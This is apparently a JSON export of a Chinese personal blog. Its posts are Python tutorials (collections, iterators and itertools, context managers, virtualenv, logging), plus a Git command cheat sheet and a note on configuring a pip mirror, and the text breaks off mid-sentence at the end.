然后将sql的查询数据转为namedtuple类，然后通过成员函数访问。举个栗子（私货）：1234567891011121314Account = namedtuple(\"Account\", [\"username\", \"password\"]) # 定义Account类...cur = self.db.cursor()cur.execute(\"SELECT username, password FROM account\\ WHERE valid=1\\ ORDER BY RANDOM()\\ LIMIT 1\")account= Account._make(cur.fetchone()) # 将数据tuple转为Account对象self.postdata[\"username\"] = account.username # 直接访问成员数据self.postdata[\"password\"] = account.password...# self.login(username, password)self.login(account) # 可以将account整体作为参数，使程序看起来更简洁... 3. deque - 双端队列 3.1 介绍deque为Double-Ended Queue的简写，用于提供一个可以快速进行两端的插入或删除操作的队列，同时可以像list一样通过下标访问数据。由于list是储存在线性空间的，其插入/删除数据的时间复杂度为O(n)，所以当list比较长的时候，在其头部插入/删除数据的操作需要耗费大量时间。所以如果需要对list对象进行大量头和尾的插入删除操作时，使用deque会使程序的运行效率更高（当然，使用Queue模块的Queue和LifoQueue也是不错的选择）。需要注意的是，deque对象不支持在中间位置的插入操作。deque对象也被包含在Queue模块中。 3.2 成员函数append(x), appendleft(x), 在deque的尾/头插入对象x, 与list类似；extend(iterable), extendleft(iterable), 与list的extend类似；pop(x), popleft(x), 与list的pop类似；clear(), 清空deque的所有元素；count(x), 统计deque中x元素的个数；remove(x), 删除deque中的x元素，若x元素不存在，则触发ValueError;reverse(), 将deque反转，返回None, 与list的reverse类似;rotate(i), 将deque最末尾i个元素取出并插入头部，若i&lt;0, 则将头部|i|个元素取出添加到尾部。 4. Counter - 计数器 4.1 介绍Counter类是dict的子类，提供一个计数器，可对hashable的对象进行计数。需要注意的是，对象的计数可以小于0. 4.2 基本操作直接上例子：12345678910&gt;&gt;&gt; c = Counter() # 空计数器&gt;&gt;&gt; c = Counter('gallahad') # 对iterable对象中的元素进行计数&gt;&gt;&gt; c = Counter(&#123;'red': 4, 'blue': 2&#125;) # 从map中读取元素和对应计数&gt;&gt;&gt; c = Counter(cats=4, dogs=8) # 从关键字参数中获取&gt;&gt;&gt; cCounter(&#123;'dogs': 8, 'cats': 4&#125;)&gt;&gt;&gt; c[\"dogs\"] # 获取计数8&gt;&gt;&gt; c[\"elephants\"] # 对于不存在的元素，会返回0 0 4.3 成员函数elements(), 返回一个迭代器，包含Counter中的所有元素，若元素x的计数为n，则x在迭代器中会出现n次。123c = Counter(a=4, b=2, c=0, d=-2)&gt;&gt;&gt; list(c.elements())['a', 'a', 'a', 'a', 'b', 'b']most_common([n]), 返回计数最多的n个元素。12&gt;&gt;&gt; Counter('abracadabra').most_common(3)[('a', 5), ('r', 2), ('b', 2)]update([iterable-or-mapping]), 在现有计数上添加参数所对应的计数。123456&gt;&gt;&gt; c = Counter(\"1233\")&gt;&gt;&gt; cCounter(&#123;'3': 2, '1': 1, '2': 1&#125;)&gt;&gt;&gt; c.update(\"2345\")&gt;&gt;&gt; cCounter(&#123;'3': 3, '2': 2, '1': 1, '5': 1, '4': 1&#125;)substact([iterable-or-mapping]), 在现有计数上减去参数所对应的计数。可以用在Counter对象上的通用函数和常见用法有：sum(c.values()), 所有计数之和c.clear(), 将计数重置list(c), 返回所有元素构成的列表, 其中元素不会重复set(c), 转化为setdict(c), 转化为dictc.items(), 转化为由(元素, 计数)构成的列表Counter(dict(list_of_pairs)), 从上述列表转化为Counter对象c.most_common()[:-n-1:-1], 出现最少的n个元素c += Counter(), 移除所有元素计数为0的元素注意: 将某元素的计数赋值为0, 并不能在计数器的元素列表中删除该元素。若要删除该元素，需要用del.12345678910111213&gt;&gt;&gt; c = Counter(\"12\")&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"]0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"] = 0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1, '0': 0&#125;)&gt;&gt;&gt; del c[\"0\"]&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;) 5. defaultdict 5.1 介绍defaultdict类是dict类的子类，包含dict类的所有功能。与dict不同的是，在调用不存在的键值时，dict会抛出KeyError异常，而defaultdict会执行__missing__函数, 通过调用该函数来进行操作或返回值。定义方式如下:1234d = defaultdict() # 这种定义方式返回的对象跟普通dict无异a = defaultdict(lambda: \"N/A\") # 定义__missing__函数print a[\"0\"] # 返回\"N/A\", 同时a[\"0\"]被赋值为\"N/A\" 5.2 应用场景1234567&gt;&gt;&gt; s = [('yellow', 1), ('blue', 2), ('yellow', 3), ('blue', 4), ('red', 1)]&gt;&gt;&gt; d = defaultdict(list) # 若键值不存在，则赋值为[]&gt;&gt;&gt; for k, v in s:... d[k].append(v)...&gt;&gt;&gt; d.items()[('blue', [2, 4]), ('red', [1]), ('yellow', [1, 3])] 6. OrderdDict 6.1 简介使用dict时，Key是无序的。在对dict做迭代时，我们无法确定Key的顺序。如果要保持Key的顺序，可以用OrderedDict.OrderedDict的键值顺序按照键值被插入的顺序排列，而不是Key本身的顺序。OrderdDict的键值可以通过调用popitem函数被弹出，弹出时弹出(key, item)的键值对。1234567891011&gt;&gt;&gt; a = OrderedDict(&#123;\"one\": 1&#125;) # 可通过dict定义，也可传入可迭代对象&gt;&gt;&gt; a[\"zero\"] = 0&gt;&gt;&gt; a[\"two\"] = 2&gt;&gt;&gt; aOrderedDict([('one', 1), ('zero', 0), ('two', 2)])&gt;&gt;&gt; a.popitem() # 弹出最后一个键值对('two', 2)&gt;&gt;&gt; a.popitem(last=False) # 弹出第一个键值对('one', 1)&gt;&gt;&gt; aOrderedDict([('zero', 0)]) 7. 参考文档8.3 collections — High-performance container datatypescollections - 廖雪峰的官方教程 8. 后记这篇博文写了两天，感觉在翻译文档，有点枯燥。一直觉得应该多去了解Python的内置常用模块，不要求完全熟练，至少要有个印象，这样在开发中需要使用这些模块的时候，才能够想起来用它。所以，又填完一个坑。下一个应该是unittest吧。","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"collections","slug":"collections","permalink":"https://blog.stdioa.com/tags/collections/"}]},{"title":"Python学习之迭代器","slug":"learning-python-iterator","date":"2015-10-26T07:43:00.000Z","updated":"2018-07-12T00:14:48.942Z","comments":true,"path":"2015/10/learning-python-iterator/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-iterator/","excerpt":"昨晚用python写了个简单的链表，突然想起了迭代器，就随手整理一下，顺便过一下itertools模块。","text":"昨晚用python写了个简单的链表，突然想起了迭代器，就随手整理一下，顺便过一下itertools模块。 1. 简介迭代器(iterator)是Python中一种用来进行惰性迭代的数据类型，迭代器可以惰性地在需要时生成数据并返回已进行迭代，而不需要在开始进行时生成所有数据（有的时候也不可能生成所有数据，比如斐波那契数列的无穷迭代等）然后一个一个返回。 2. 用法 2.1 最基础的例子: iter()函数生成迭代器1234567891011list_ = [1,2]it = iter(list_) # 返回一个迭代器it.next() # 获取一个迭代器元素，返回1next(it) # 使用next内建函数，等同于it.next(), 返回2it.next() # 迭代结束，触发StopIteration异常list_ = [1,2]it = iter(list_)for x in it: # 用for循环对迭代器进行循环迭代 print x # 迭代结束时，StopIteration不会被触发值得注意的是，迭代器只可向前迭代，不能向后迭代，获取之前已返回过的值（当然绝大多数的时候也没必要向后迭代）。 2.2 生成器[x*2 for x in range(10) if x%2==0], 这段代码为列表生成式（也称作列表解析），可以将一个列表进行转化；将方括号变为圆括号，(x*2 for x in range(10) if x%2==0), 则该代码变为一个生成器(generator)。生成器可以像迭代器一样进行迭代，还可以通过生成器的成员函数和生成器内部的代码进行数据交换。 3. 自定义迭代器及生成器 3.1 自定义迭代器在编写类的时候，可以通过定义类的__iter__函数来使类可以转化为迭代器。在__iter__函数结束时，会自动引发StopIteration异常。例:12345678910111213141516class Counter(object): def __init__(self): self.number = 0 def __iter__(self): while True: yield self.number self.number += 1a = Counter()it = iter(a)print it.next() # 0print it.next() # 1for num in it: print num # 因为该迭代器为无穷迭代，所以会导致死循环 3.2 自定义生成器可以用函数自定义生成器。例：1234567891011def fib(): a, b = 1, 1 while True: yield a # 用yield函数来在迭代时返回值，在下次迭代时，自动从yield语句的下一条语句开始执行 a, b = b, a+bk = fib()for i in range(10): print next(k) # 1 1 2 3 5 8 13 21 34 55print type(k) # &lt;generator object fib at 0x0268BDF0&gt; 3.3 生成器的进阶用法generator.next()用来进行迭代并获取返回值；generator.close()用来关闭生成器，并在下次迭代时出发StopIteration异常。1234a = fib()print next(a) # 1a.close() # 关闭迭代器print next(a) # StopIterationgenerator.send(arg)可以向生成器内部传递对象，generator.throw(typ[,val[,tb]])可以向生成器内部传递异常（包括类型，具体异常对象和Traceback）；在调用这两个函数后，生成器立刻进行迭代并返回值（或触发StopIteration）。具体操作：123456789101112131415161718def counter(): num = 0 while True: try: ret = yield num except ValueError: print \"ValueError caught\" if ret is not None: num = ret num += 1c = counter()print c.next() # 0print c.send(3) # 传输3，内部yield语句返回3，然后进行下次迭代，生成4print c.next() # 5c.throw(ValueError) # 传递异常，内部yield函数触发异常，然后进行异常处理，输出\"ValueError caught\"，若未处理，则异常会向上层抛出print c.next() # 6 4. itertools模块itertools是Python自带的一个模块，包含很多使用函数，用来对一个或多个可迭代对象进行操作后返回一个迭代器。具体函数列表：无限迭代器count(start, [step])从start开始，以后每个元素都加上step。step默认值为1。count(5) -&gt; 5 6 7 …cycle(p)迭代至p的最后一个元素之后，从p的第一个元素重新迭代。cycle('abc') -&gt; a b c a b c …repeat(elem [,n])无限重复或重复n次返回elem。repeat(&quot;Ah&quot;, 3) -&gt; “Ah” “Ah” “Ah”在最短的序列结束迭代时停止迭代chain(p, q, …)迭代至序列p的最后一个元素后，从q的第一个元素开始，直到所有序列终止。chain(&quot;ABC&quot;, &quot;DEF&quot;) -&gt; A B C D E Fcompress(data, selectors)如果bool(selectors[n])为True，则next()返回data[n]，否则跳过data[n]。compress('ABCDEF', [1,0,1,0,1,1]) -&gt; A C E Fdropwhile(pred, seq)当pred对seq[n]的调用返回False时才开始迭代。dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 6 4 1takewhile(pred, seq)dropwhile的相反版本。takewhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 1 4ifilter(pred, seq)内建函数filter的迭代器版本。ifilter(lambda x: x%2, range(10)) -&gt; 1 3 5 7 9ifilterfalse(pred, seq)ifilter的相反版本。ifilterfalse(lambda x: x%2, range(10)) -&gt; 0 2 4 6 8imap(func, p, q, ...)内建函数map的迭代器版本。imap(pow, (2,3,10), (5,2,3)) -&gt; 32 9 1000starmap(func, seq)将seq的每个元素以变长参数(*args)的形式调用func。starmap(pow, [(2,5), (3,2), (10,3)]) -&gt; 32 9 1000izip(p, q, ...)内建函数zip的迭代器版本。izip('ABCD', 'xy') -&gt; Ax Byizip_longest(p, q, ..., fillvalue=None)izip的取最长序列的版本，短序列将填入fillvalue。izip_longest('ABCD', 'xy', fillvalue='-') -&gt; Ax By C- D-tee(it, n)返回n个迭代器it的复制迭代器。groupby(iterable[, keyfunc])这个函数功能类似于SQL的分组。使用groupby前，首先需要使用相同的keyfunc对iterable进行排序，比如调用内建的sorted函数。然后，groupby返回迭代器，每次迭代的元素是元组(key值, iterable中具有相同key值的元素的集合的子迭代器)。或许看看Python的排序指南对理解这个函数有帮助。groupby([0, 0, 0, 1, 1, 1, 2, 2, 2]) -&gt; (0, (0 0 0)) (1, (1 1 1)) (2, (2 2 2))组合迭代器product(p, q, ... [repeat=1])生成笛卡尔积。product('ABCD', repeat=2) --&gt; AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DDpermutations(p[, r])生成全排列。permutations('ABCD', 2) --&gt; AB AC AD BA BC BD CA CB CD DA DB DCcombinations(p, r)生成组合。combinations('ABCD', 2) --&gt; AB AC AD BC BD CDcombinations_with_replacement()生成排列元素(p, q), 且p&lt;q.combinations_with_replacement('ABCD', 2) --&gt; AA AB AC AD BB BC BD CC CD DD部分文字来源：http://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html 5. 参考文档itertools - Python Doc生成器 - 廖雪峰的Python教程Python 迭代器 &amp; __iter__方法Python函数式编程指南（三）：迭代器","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"迭代器","slug":"迭代器","permalink":"https://blog.stdioa.com/tags/迭代器/"}]},{"title":"Python学习之上下文管理","slug":"learning-python-context-management","date":"2015-10-22T12:00:00.000Z","updated":"2018-07-12T00:14:50.518Z","comments":true,"path":"2015/10/learning-python-context-management/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-context-management/","excerpt":"最近突发奇想，想写一个能改变当前输出环境，输出彩色文字的上下文管理器，于是学习了一下上下文管理。","text":"最近突发奇想，想写一个能改变当前输出环境，输出彩色文字的上下文管理器，于是学习了一下上下文管理。 1. 简介上下文管理器(context manager)是Python2.5开始支持的一种语法，用于规定某个对象的使用范围。一旦进入或者离开该使用范围，会有特殊操作被调用 (比如为对象分配或者释放内存)。一个最简单的例子:12345with file(\"a.txt\", \"r\") as f: s = f.read() print f.closed # 此时文件是打开的print f.closed # 变量s和f依然存在，但此时f已关闭 2. 编写上下文管理器为一个类编写上下文管理器时，需要定义类的__enter__和__exit__函数。 2.1 __enter__函数__enter__函数规定如下：contextmanager.__enter__()Enter the runtime context and return either this object or another object related to the runtime context. The value returned by this method is bound to the identifier in the as clause of with statements using this context manager.进入当前上下文，并返回当前对象或另一个与当前上下文相关的对象。被该函数返回的变量会通过该上下文管理器与with文法中as后的声明所绑定。例：12345678910class BracketAdder(object): def __enter__(self): # do something with self and runtime context sys.stdout.write(\"(\") # 输出左括号 return self # __exit__函数略with BracketAdder() as ba: # do_something 2.2 __exit__函数__exit__函数格式如下:contexmanager.__exit__(exc_type, exc_val, exc_tb)文档太长懒得翻译了_(:зゝ∠)_如果代码块中出现异常，exc_type为异常类型，exc_val为该异常，exc_tb为traceback.__exit__函数应返回一个bool类型，若返回值为True, 则在代码块及__exit__函数运行结束后不会抛出任何异常，然后立即执行后面的代码；若返回值为False，则在__exit__函数运行结束后抛出异常。若代码块中未出现异常，则三个变量均为None.例：12345678910111213class BracketAdder(object): # __enter__函数略 def __exit__(self, exc_type, exc_val, exc_tb): # do something with self and runtime context sys.stdout.write(')') if exc_type == NameError: return True else: return Falsewith BracketAdder(): print a # 若执行这一条引发NameError异常，则异常不会被抛出 a = 1/0 # 若执行这一条引发ZeroDivisionError, 则异常会被抛出 3. 综合示例1234567891011121314151617181920212223242526272829303132333435# coding: utf-8import sysclass CManager(object): def __init__(self): self.in_context = False def __enter__(self): self.in_context = True print \"I'm entering the context\" return self def __exit__(self, exc_type, exc_val, exc_tb): self.in_context = False print \"I'm leaving the context\" if exc_type == NameError: # 拦截NameError异常 return True else: return False def show(self): print \"I'm &#123;status&#125;in the context.\".format( status=\"\" if self.in_context else \"not \")with CManager() as ba: ba.show() # blahblah raise NameError # 触发NameError异常，代码块后面的语句实际不会执行，而该异常会在__exit__函数中被拦截 print 'k'ba.show()程序输出:1234I&apos;m entering the contextI&apos;m in the context.I&apos;m leaving the contextI&apos;m not in the context. 4. 参考文档Context Manager Types - Python DocPython深入02 上下文管理器浅谈 Python 的 with 语句 5. 后记这些小知识点平时只是粗略的看一下，只能达到会用的程度，有时候觉得只有自己整理一遍才能真正理解它们，才能熟练运用。所以…又填完一个坑。周末简单写写PyQt4吧…","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"上下文管理","slug":"上下文管理","permalink":"https://blog.stdioa.com/tags/上下文管理/"}]},{"title":"Python学习之virtualenv","slug":"learning-python-virtualenv","date":"2015-10-22T02:15:00.000Z","updated":"2018-07-12T00:14:44.948Z","comments":true,"path":"2015/10/learning-python-virtualenv/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-virtualenv/","excerpt":"用过virtualenv的人都说好，可是我没有具体使用过，所以尝试了一下，用完我也说好~233333","text":"用过virtualenv的人都说好，可是我没有具体使用过，所以尝试了一下，用完我也说好~233333 1. 简介virtualenv是一个python库，用于创建独立python开发及运行环境。一般linux环境下如果在全局用pip安装模块时需要使用sudo命令，可是在共享主机上将root权限交给一般用户是不显示而且不安全的。可是有了virtualenv, 普通用户就可以创建一个虚拟环境，然后在虚拟环境中以普通用户权限安装模块，更改环境变量，进行开发和运行python程序而不会影响系统环境的环境变量和Python模块。 2. 创建virtualenv环境输入virtualenv venv创建名为venv的虚拟环境。创建虚拟环境的常用选项：–no-site-packages 不使用系统中的site packages–system-site-package 使用系统中的site packages (据说是默认，但在我这默认是不使用的)-p PYTHON_EXE, --python=PYTHON_EXE 使用指定的python解释器，这里的PYTHON_EXE在Windows下需要用绝对路径，比如C:\\Python27\\python.exe\\当然，也可以使用虚拟环境和系统配置文件来设置virtualenv默认创建选项，详情见这里。输出：123G:\\&gt;virtualenv venvNew python executable in venv\\Scripts\\python.exeInstalling setuptools, pip, wheel...done. 3. 进入及退出虚拟环境进入venv目录，Linux下输入bin/activate, Windows下输入Scripts\\activate进入虚拟环境。12G:\\venv&gt;Scripts\\activate(venv) G:\\venv&gt;进入环境后，输入deactivate退出。12(venv) G:\\venv&gt;deactivateG:\\venv&gt; 4. 使用虚拟环境 4.1 安装第三方模块安装过程与平时相符（比如使用pip install), 只不过安装后的包会存储在虚拟环境中。 4.2 设置环境变量Linux下输入export VAR1=&quot;value1&quot;, Windows下输入set VAR1=value1来设置虚拟环境的环境变量1234(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;set VAR1=value1(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;echo %VAR1%value1环境变量设置成功后，即可在Python程序中利用虚拟环境的环境变量进行程序配置（比如flask中的app.config.from_envvar(&quot;FLASK_SETTINGS&quot;)）。该环境变量只在虚拟环境中有效，退出虚拟环境后环境变量即消失。 5. 参考文档Virtualenv - virtualenv 13.1.2 documentationVirtualenv - virtualenv 1.7.1.2.post1 documentation 中文版virtualenv入门教程virtualenv – python虚拟沙盒用virtualenv建立多个Python独立开发环境 6. 后记又填完一个坑，本来打算昨天就写好的，结果昨天没写完…","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"virtualenv","slug":"virtualenv","permalink":"https://blog.stdioa.com/tags/virtualenv/"}]},{"title":"Python学习之logging","slug":"learning-python-logging","date":"2015-10-21T08:00:00.000Z","updated":"2018-07-12T00:14:48.044Z","comments":true,"path":"2015/10/learning-python-logging/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-logging/","excerpt":"以前写代码的时候，所有信息包括调试信息全部输出在屏幕上，有的时候会看起来乱糟糟的，这时就需要logging模块来记录信息或生成日志文件。","text":"以前写代码的时候，所有信息包括调试信息全部输出在屏幕上，有的时候会看起来乱糟糟的，这时就需要logging模块来记录信息或生成日志文件。 1. 简介logging是一个用来记录日志信息的模块，它可以输出信息到stdout或者自定的日志文件中。 2. 基本输出信息：12345logging.debug(\"A debug message\")logging.info(\"A info message\")logging.warn(\"A warning message\")logging.error(\"A error message\")logging.critical(\"A critical message\")日志级别：logging默认的日志级别为WARNING，在当前级别下，只有warning及以上的日志可以被记录。logging的级别可通过logging.basicConfig或logging.setLevel来修改。级别大小关系为CRITICAL(50) &gt; ERROR(40) &gt; WARNING(30) &gt; INFO(20) &gt; DEBUG(10) &gt; NOTSET(0), 需要注意的是，一旦记录信息，logging的日志级别就不可再更改。12345&gt;&gt;&gt; logging.basicConfig(level=logging.INFO)&gt;&gt;&gt; logging.info(\"Info\")INFO:root:Info&gt;&gt;&gt; logging.basicConfig(level=logging.DEBUG)&gt;&gt;&gt; logging.debug(\"Debug\") # 没有输出 3. 日志格式设置及日志文件操作12345678910111213import loggingimport timelogging.basicConfig(format=\"%(asctime)s %(levelname)s %(message)s\", datefmt=\"%Y %b %d %H:%M:%S\", filename=\"./log.log\", filemode=\"w\", # default is \"a\" level=logging.INFO)while True: for i in range(6): logging.log(i*10, \"a log\") # logging.log(level, msg) time.sleep(1)log.log输出(可以用tail -f命令实时查看):123456782015 Oct 21 14:41:36 INFO a log2015 Oct 21 14:41:37 WARNING a log2015 Oct 21 14:41:38 ERROR a log2015 Oct 21 14:41:41 CRITICAL a log2015 Oct 21 14:41:42 INFO a log2015 Oct 21 14:41:43 WARNING a log2015 Oct 21 14:41:44 ERROR a log2015 Oct 21 14:41:45 CRITICAL a log 4. 将日志输出到多个流中12345678910111213141516171819import loggingimport sys# 可以通过logging.basicConfig设置一个默认流console = logging.StreamHandler(stream=sys.stdout) # 默认流为sys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)logging.getLogger().addHandler(console)files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # 设置文件流files.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(levelname)s %(message)s\")files.setFormatter(formatter)logging.getLogger().addHandler(files)for i in range(1, 6): logging.log(i*10, logging.getLevelName(i*10).lower()) 5. 设置多个logger以记录不同信息123456789101112131415161718192021222324252627# coding: utf-8import loggingimport syslog1 = logging.Logger(\"0.0\")console = logging.StreamHandler(sys.stdout) # 默认流为sys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)log1.addHandler(console)log2 = logging.Logger(\"-.-\")files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # 设置文件流files.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(name)s %(levelname)s %(message)s\")files.setFormatter(formatter)log2.addHandler(files)for i in range(1, 6): log1.log(i*10, logging.getLevelName(i*10).lower()) log2.log(i*10, logging.getLevelName(i*10).lower())logging.critical(\"AHHH! I'm the root logger but you forget me!\") # 默认使用logging时logger name为\"root\"logging.getLogger(\"root\").info(\"Of course not!\") 5. 参考文档Logging HOWTOpython 的日志logging模块学习 6. 后记又填完一个坑，最近要填的坑好多…","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"logging","slug":"logging","permalink":"https://blog.stdioa.com/tags/logging/"}]},{"title":"随手记之Git","slug":"essay-git","date":"2015-10-14T10:28:00.000Z","updated":"2018-07-12T00:15:05.238Z","comments":true,"path":"2015/10/essay-git/","link":"","permalink":"https://blog.stdioa.com/2015/10/essay-git/","excerpt":"从一年前开始使用Git, 一直没系统整理过Git的命令，前几天在部署代码的时候出了问题不知道该如何解决，于是决定整理一份Git的使用方法。本博文会持续更新。","text":"从一年前开始使用Git, 一直没系统整理过Git的命令，前几天在部署代码的时候出了问题不知道该如何解决，于是决定整理一份Git的使用方法。本博文会持续更新。 1. 什么是GitLinus大神写的分布式版本控制工具，具体请访问官网http://git-scm.com.Wikipedia链接: Git (software) 2. 基本操作初始化版本仓库: git init从远程仓库克隆: git clone [url] [repo_name]例: git clone https://github.com/user/repo my_repo文件的状态变化周期检查文件状态: git status状态简览: git status -s123456$ git status -s M READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txt字母所代表的状态??未追踪M已修改，未暂存MM修改后暂存，然后又修改A新添加到暂存区M修改后添加到暂存区忽略文件： 编辑.gitignore文件。文件 .gitignore 的格式规范如下：所有空行或者以 ＃ 开头的行都会被 Git 忽略。可以使用标准的 glob 模式匹配。匹配模式可以以（/）开头防止递归。匹配模式可以以（/）结尾指定目录。要忽略指定模式以外的文件或目录，可以在模式前加上惊叹号（!）取反。具体例子见Git-基础。查看尚未暂存的文件更新部分: git diff查看已暂存的文件更新的部分: git diff --staged提交更新: git commitgit commit -a = git add --all; git commit提交时输入单行信息(Commit log): git commit -m添加文件: git add [filename], 使git跟踪文件删除文件: git rm [filename], 使git停止跟踪文件并将文件删除停止跟踪文件: git rm --cached, 停止跟踪但不删除文件移动文件: git mv, 规则和mv基本相同查看提交历史: git log显示每次提交的内容差异: git log -p查看每次提交的简略统计信息: git log --stat查看每次提交的代码更改详情：git log --cc显示ASCII图形表示的分支合并历史: git log --graph粗略显示: git log --oneline --graph --decorate --all更多请输入git log --help查看man page.更改上次提交: git commit --amend取消暂存: git reset HEAD [filename]取消暂存并丢弃现有的更改: git reset HEAD --hard [filename], 未提交的更改会丢失撤销对文件的更改: git checkout -- [filename], 未提交的更改会丢失git push origin --delete [branch], 删除远程分支 3. 分支操作git branch [branch], 在当前引用上建立新分支git checkout -b [branch], 建立新分支并检出到该分支上commit引用方式:直接hash引用: d921970aadf03b3cf0e71becdaab3147ba71cdef, d921970分支引用: HEAD, master相对引用: HEAD^, HEAD^^, HEAD~2若a是一个合并提交，有两个父引用，则a^为a的第一父引用，a^2为a的第二父引用。条件引用: master@{yesterday}, master@{1.week.before}引用区间:refA..refB选择从refA和refB的共同祖先开始直到refB的所有提交。例:1234若 1 - 2 - 3 - 4 ← refA \\ 5 - 6 ← refBrefA..refB 即为6 5, refB..refA 即为4 3.origin/master..master为master分支上还未提交到远端的所有引用区间筛选，例：以下三条命令等价：$ git log refA..refB$ git log ^refA refB$ git log refB --not refArefA...refB选择出被两个引用中的一个包含但又不被两者同时包含的提交，即refA..refB+refB..refA12345$ git log --left-to-right refA...refB&lt; 4&lt; 3&gt; 6&gt; 5 4. 工作储藏git stash &quot;comments&quot;, 储藏所有工作，包括已添加的和已更改未添加的git stash apply stash@{0}, 恢复储藏，可能会产生冲突，解决冲突后git add添加git stash list, 列出储藏栈git stash show [stashname], 查看储藏的更改git stash pop, 应用栈顶储藏并弹出储藏git stash drop [stashname], 删除储藏git stash branch [branchname], 应用储藏到某分支并切换到该分支git stash --keep-index, 只储藏已更改未添加的改动，不储藏 已添加的git stash --include-untracked, 储藏未追踪的文件（未追踪文件）并将其从工作目录中删除git stash --all, 贮藏所有文件 5. git resetgit reset --soft HEAD^, 将HEAD指针及当前分支指针指向HEAD^, 工作目录中所有的文件均添加暂存(staged), 类似“撤销git commit命令”，但如果重新提交，会创造一个hash不同的commit，即时提交内容完全相同。git reset --mixed HEAD^, 将HEAD指针及当前分支指针指向HEAD^, 工作目录中的更改未暂存(modified but not staged), 类似“撤销git add和git commit命令”git reset --hard HEAD^, 将HEAD指针及当前分支指针指向HEAD^, 工作目录中的更改完全丢失，相当于“撤销更改, git add和git commit”.","categories":[{"name":"随手记","slug":"随手记","permalink":"https://blog.stdioa.com/categories/随手记/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"},{"name":"编程工具","slug":"编程工具","permalink":"https://blog.stdioa.com/tags/编程工具/"}]},{"title":"随手记 - 用国内镜像加速pip","slug":"essay-pip-acceleration","date":"2015-09-29T15:01:00.000Z","updated":"2018-07-12T00:15:04.549Z","comments":true,"path":"2015/09/essay-pip-acceleration/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-pip-acceleration/","excerpt":"原来Windows和Linux更改镜像源的方式是不一样的啊。","text":"原来Windows和Linux更改镜像源的方式是不一样的啊。 1. 引子偶然发现USTC有一个pypi的源(在这里)，照着USTC给的镜像使用帮助更改镜像源无果。今天闲来无事就多搜了一下。 2. 过程USTC的镜像使用帮助里说，将index-url = https://pypi.mirrors.ustc.edu.cn/simple添加到~/.pip/pip.conf文件中，按照此思路看，如果我在Windows下使用的话，应该将配置信息添加到C:\\Users\\Stdio\\.pip\\pip.conf文件中。然而添加后并没有什么卵用。今天看见一个博文说文件设置路径应为%HOME%\\pip\\pip.ini，于是试了一下（绝对路径为C:\\Users\\Stdio\\pip\\pip.ini），成功。用了USTC的源，装个软件速度简直飞起︿(￣︶￣)︿弄好以后多了个心眼，去看看官方怎么说，于是找到了pip的Documentation（在这里）里面讲述了配置文件所在位置。1234567891011121314151617181920Config filepip allows you to set all command line option defaults in a standard ini style config file.The names and locations of the configuration files vary slightly across platforms. You may have per-user, per-virtualenv or site-wide (shared amongst all users) configuration:Per-user:On Unix the default configuration file is: $HOME/.config/pip/pip.conf which respects the XDG_CONFIG_HOME environment variable.On Mac OS X the configuration file is $HOME/Library/Application Support/pip/pip.conf.On Windows the configuration file is %APPDATA%\\pip\\pip.ini.There are also a legacy per-user configuration file which is also respected, these are located at:On Unix and Mac OS X the configuration file is: $HOME/.pip/pip.confOn Windows the configuration file is: %HOME%\\pip\\pip.iniYou can set a custom path location for this config file using the environment variable PIP_CONFIG_FILE.Inside a virtualenv:On Unix and Mac OS X the file is $VIRTUAL_ENV/pip.confOn Windows the file is: %VIRTUAL_ENV%\\pip.ini于是自己将配置文件放在了%APPDATA%\\pip\\pip.ini，即C:\\Users\\Stdio\\AppData\\Roaming\\pip\\pip.ini下，经实验，加速成功。经测试，系统层面的全局设置会影响到virtualenv建立的虚拟环境设置，所以可以通过设置虚拟环境的配置文件来更改虚拟环境设置，设置文件就放在虚拟环境根目录下就好了。 3. 瞎写改了软件源以后为了做测试升级了numpy，然后编译用了半天中间电脑卡到死，现在它还在我的腿上发烫真是伤不起- -写的东西越来越没有营养了，就当是写着玩顺带积累一下知识吧。如果不出意外的话，下一篇应该是关于Python Qt Creater和Qt 